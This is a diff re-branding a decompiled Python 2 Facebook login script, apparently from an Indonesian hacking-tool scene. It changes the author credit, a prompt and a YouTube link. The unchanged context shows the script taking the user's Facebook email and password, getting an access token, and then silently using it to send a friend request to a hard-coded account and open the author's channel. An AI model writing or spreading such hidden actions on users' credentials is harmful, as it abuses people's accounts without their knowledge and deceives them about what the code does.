@@ -1,4 +1,4 @@
-#Decompiled MR.FIRDAUS GANS
+#Decompiled MR.D4U5
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
@@ -66,7 +66,7 @@ def login():
         print logo
         print 40 * '\x1b[1;97m\xe2\x95\x90'
         print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK AKUN FB \x1b[1;91m[\xe2\x98\x86]'
-        id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername FB \x1b[1;91m:\x1b[1;92m ')
+        id = raw_input('\x1b[1;91m[+] \x1b[1;36mEmail/No FB \x1b[1;91m:\x1b[1;92m ')
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
         tik()
         try:
@@ -97,7 +97,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://youtube.com/NjankSoekamti')
+                os.system('xdg-open https://youtube.com/D4U515')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
